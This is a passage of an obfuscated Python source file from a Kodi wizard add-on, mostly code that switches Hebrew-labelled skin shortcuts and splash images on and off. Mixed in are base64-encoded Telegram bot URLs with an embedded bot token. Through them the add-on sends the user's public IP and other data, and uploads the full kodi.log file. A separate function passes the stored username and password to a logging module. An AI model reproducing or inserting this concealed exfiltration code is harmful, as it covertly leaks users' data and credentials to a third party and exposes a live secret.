          OOOOOO0OO000O00OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:576
          OO0OO0OO0OOOOOOOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:577
          O0O0OOOOOO0000OO0 =str (json .loads (OO0OO0OO0OOOOOOOO )['ip'])#line:578
          OO0000OO0000O0000 =OO00OOOO00OO0O000 #line:579
          O00OO0000O0OO00OO =OO0OO0O0O0OOO0O00 #line:580
          import socket #line:582
          OO0OO0OO0OOOOOOOO =urllib2 .urlopen (OOOOOO0OO000O00OO .decode ('base64')+' - '+OO0000OO0000O0000 +' - '+O00OO0000O0OO00OO +' - '+O00O0000OOOO00000 ).readlines ()#line:583
       except :pass #line:584
def googleindicat ():#line:587
			import logg #line:588
			O00OOOOO0OOO0OO00 =(ADDON .getSetting ("pass"))#line:589
			O0000OOO000OOO000 =(ADDON .getSetting ("user"))#line:590
			logg .logGA (O00OOOOO0OOO0OO00 ,O0000OOO000OOO000 )#line:591
def logsend ():#line:592
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:593
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:594
      howsentlog ()#line:596
      import requests #line:597
      if xbmc .getCondVisibility ('system.platform.windows'):#line:598
         OO00O0O00OO0O00O0 =xbmc .translatePath ('special://home/kodi.log')#line:599
         O00O00O000O000000 ={'chat_id':(None ,'-274262389'),'document':(OO00O0O00OO0O00O0 ,open (OO00O0O00OO0O00O0 ,'rb')),}#line:603
         OOOOOOOOO0OO00000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:604
         O0OOOOOOO0000OOOO =requests .post (OOOOOOOOO0OO00000 .decode ('base64'),files =O00O00O000O000000 )#line:606
      elif xbmc .getCondVisibility ('system.platform.android'):#line:607
           OO00O0O00OO0O00O0 =xbmc .translatePath ('special://temp/kodi.log')#line:608
           O00O00O000O000000 ={'chat_id':(None ,'-274262389'),'document':(OO00O0O00OO0O00O0 ,open (OO00O0O00OO0O00O0 ,'rb')),}#line:612
           OOOOOOOOO0OO00000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:613
           O0OOOOOOO0000OOOO =requests .post (OOOOOOOOO0OO00000 .decode ('base64'),files =O00O00O000O000000 )#line:615
      else :#line:616
           OO00O0O00OO0O00O0 =xbmc .translatePath ('special://kodi.log')#line:617
           O00O00O000O000000 ={'chat_id':(None ,'-274262389'),'document':(OO00O0O00OO0O00O0 ,open (OO00O0O00OO0O00O0 ,'rb')),}#line:621
           OOOOOOOOO0OO00000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:622
           O0OOOOOOO0000OOOO =requests .post (OOOOOOOOO0OO00000 .decode ('base64'),files =O00O00O000O000000 )#line:624
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:625
def rdoff ():#line:627
	OO0O00O0OOOO00OOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:658
	O00O00O0O00O0OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:659
	copyfile (OO0O00O0OOOO00OOO ,O00O00O0O00O0OOO0 )#line:660
def skindialogsettind18 ():#line:661
	try :#line:662
		O000OO00OO00OOOOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:663
		O00OOO0OOOOO0O0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:664
		copyfile (O000OO00OO00OOOOO ,O00OOO0OOOOO0O0O0 )#line:665
	except :pass #line:666
def rdon ():#line:667
	loginit .loginIt ('restore','all')#line:668
	O0OO0O00O0OOOOOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:670
	OO0O0O00OO0O0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:671
	copyfile (O0OO0O00O0OOOOOO0 ,OO0O0O00OO0O0O0OO )#line:672
def adults18 ():#line:674
  OO0OO0O0O0OO0000O =(ADDON .getSetting ("adults"))#line:675
  if OO0OO0O0O0OO0000O =='true':#line:676
    OOOOO0OOO00OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:677
    with open (OOOOO0OOO00OOOOO0 ,'r')as O000OO0O00O0OO0O0 :#line:678
      O000OO00000OOOO0O =O000OO0O00O0OO0O0 .read ()#line:679
    O000OO00000OOOO0O =O000OO00000OOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:697
    with open (OOOOO0OOO00OOOOO0 ,'w')as O000OO0O00O0OO0O0 :#line:700
      O000OO0O00O0OO0O0 .write (O000OO00000OOOO0O )#line:701
def rdbuildaddon ():#line:702
  OOO0OOO00O0OOO000 =(ADDON .getSetting ("auto_rd"))#line:703
  if OOO0OOO00O0OOO000 =='true':#line:704
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:705
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:706
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:707
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:725
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:728
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:729
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:733
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:734
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:735
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:753
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:756
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:757
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:761
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:762
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:763
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:781
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:784
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:785
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:789
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:790
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:791
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:809
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:812
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:813
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:816
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:817
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:818
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:836
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:839
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:840
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:842
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:843
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:844
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:862
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:865
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:866
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:868
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:869
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:870
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:888
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:891
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:892
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:895
    with open (OO0O0O000O00OOO0O ,'r')as OOOOOOO0OO00000O0 :#line:896
      OO0O0O0O0OO000OOO =OOOOOOO0OO00000O0 .read ()#line:897
    OO0O0O0O0OO000OOO =OO0O0O0O0OO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:915
    with open (OO0O0O000O00OOO0O ,'w')as OOOOOOO0OO00000O0 :#line:918
      OOOOOOO0OO00000O0 .write (OO0O0O0O0OO000OOO )#line:919
def rdbuildinstall ():#line:922
  try :#line:923
   O0O0OO00O0O0O000O =(ADDON .getSetting ("auto_rd"))#line:924
   if O0O0OO00O0O0O000O =='true':#line:925
     OOOOO000O000O0000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:926
     O0O0000000OOOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:927
     copyfile (OOOOO000O000O0000 ,O0O0000000OOOOOO0 )#line:928
  except :#line:929
     pass #line:930
def rdbuildaddonoff ():#line:933
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:936
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:937
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:938
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:956
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:959
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:960
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:964
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:965
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:966
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:984
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:987
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:988
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:992
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:993
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:994
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1012
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:1015
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:1016
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1020
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:1021
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:1022
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1040
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:1043
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:1044
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1047
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:1048
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:1049
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1067
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:1070
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:1071
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1073
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:1074
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:1075
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1093
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:1096
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:1097
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1099
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:1100
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:1101
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1119
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:1122
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:1123
    OOO000O0O0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1126
    with open (OOO000O0O0000O0OO ,'r')as O0OO0O00OO0OOO00O :#line:1127
      OOO00OOOO0OOO00OO =O0OO0O00OO0OOO00O .read ()#line:1128
    OOO00OOOO0OOO00OO =OOO00OOOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1146
    with open (OOO000O0O0000O0OO ,'w')as O0OO0O00OO0OOO00O :#line:1149
      O0OO0O00OO0OOO00O .write (OOO00OOOO0OOO00OO )#line:1150
def rdbuildinstalloff ():#line:1153
    try :#line:1154
       O0OOOOO0OO0OOOO0O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1155
       O0O0OO00000OO000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1156
       copyfile (O0OOOOO0OO0OOOO0O ,O0O0OO00000OO000O )#line:1158
       O0OOOOO0OO0OOOO0O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1160
       O0O0OO00000OO000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1161
       copyfile (O0OOOOO0OO0OOOO0O ,O0O0OO00000OO000O )#line:1163
       O0OOOOO0OO0OOOO0O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1165
       O0O0OO00000OO000O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1166
       copyfile (O0OOOOO0OO0OOOO0O ,O0O0OO00000OO000O )#line:1168
       O0OOOOO0OO0OOOO0O =ADDONPATH +"/resources/rdoff/Splash.png"#line:1171
       O0O0OO00000OO000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1172
       copyfile (O0OOOOO0OO0OOOO0O ,O0O0OO00000OO000O )#line:1174
    except :#line:1176
       pass #line:1177
def rdbuildaddonON ():#line:1184
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1186
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1187
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1188
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1206
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1209
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1210
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1214
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1215
